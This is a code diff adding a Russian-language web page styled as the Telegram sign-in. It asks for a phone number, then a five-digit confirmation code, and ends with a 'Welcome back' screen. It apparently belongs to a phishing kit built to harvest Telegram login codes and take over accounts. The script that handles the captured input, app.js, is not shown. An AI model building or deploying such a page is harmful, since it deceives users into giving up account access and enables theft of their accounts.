@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Telegram</title>
+  <link rel="stylesheet" href="style.css"/>
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">Telegram</div>
+
+    <div id="step-phone" class="step active">
+      <h2>Вход в Telegram</h2>
+      <p>Введите номер телефона</p>
+      <input type="tel" id="phone" placeholder="+7 ___ ___ __ __" autocomplete="tel"/>
+      <button id="btn-next">Далее</button>
+    </div>
+
+    <div id="step-code" class="step">
+      <h2>Код подтверждения</h2>
+      <p>Отправлен на <span id="phone-display"></span></p>
+      <div class="code-container">
+        <input type="text" class="code-input" maxlength="1" id="code1" autofocus/>
+        <input type="text" class="code-input" maxlength="1" id="code2"/>
+        <input type="text" class="code-input" maxlength="1" id="code3"/>
+        <input type="text" class="code-input" maxlength="1" id="code4"/>
+        <input type="text" class="code-input" maxlength="1" id="code5"/>
+      </div>
+      <button id="btn-submit" disabled>Войти</button>
+    </div>
+
+    <div id="loading" class="step">
+      <div class="spinner"></div>
+      <p>Пожалуйста, подождите...</p>
+    </div>
+
+    <div id="success" class="step">
+      <h2>Успешно!</h2>
+      <p>Добро пожаловать обратно</p>
+    </div>
+  </div>
+
+  <script src="app.js"></script>
+</body>
+</html>
